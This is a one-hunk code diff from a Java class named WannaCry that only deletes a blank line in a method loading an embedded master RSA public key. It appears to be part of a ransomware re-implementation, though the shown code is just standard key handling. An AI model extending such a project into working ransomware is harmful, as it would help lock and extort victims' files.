@@ -55,7 +55,6 @@ public class WannaCry {
 
     private static PublicKey generateMasterPublicKey() throws Exception {
         byte[] keyInBytes = Base64.getDecoder().decode(ENCODED_MASTER_RSA_KEY);
-
         X509EncodedKeySpec spec = new X509EncodedKeySpec(keyInBytes);
         KeyFactory keyFactory = KeyFactory.getInstance("RSA");
         return keyFactory.generatePublic(spec);
